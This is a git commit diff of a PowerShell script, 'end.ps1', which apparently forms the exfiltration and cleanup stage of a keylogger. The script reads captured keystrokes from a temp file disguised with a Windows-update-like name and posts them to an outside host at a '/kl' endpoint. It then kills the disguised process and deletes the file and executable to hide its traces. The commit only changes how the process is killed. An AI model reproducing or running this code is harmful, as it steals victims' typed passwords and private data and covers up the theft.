88522cc585489d9ff3d2ef314ad0da200b624a69
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-13 11:32:52 -0600

    Update end.ps1

--- end.ps1
+++ end.ps1
@@ -1,6 +1,6 @@
 $url = "https://api.dogwater53.us/kl"
 $body = @{"keys" = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")}
 Invoke-WebRequest -Method 'Post' -Uri $url -Body ($body|ConvertTo-Json) -ContentType "application/json"
-Stop-Process -Name wsuA58F.exe -Force
+taskkill -f -im wsuA58F.exe
 Remove-Item "$env:temp\wsuA58F.tmp"
 Remove-Item "$env:temp\wsuA58F.exe"
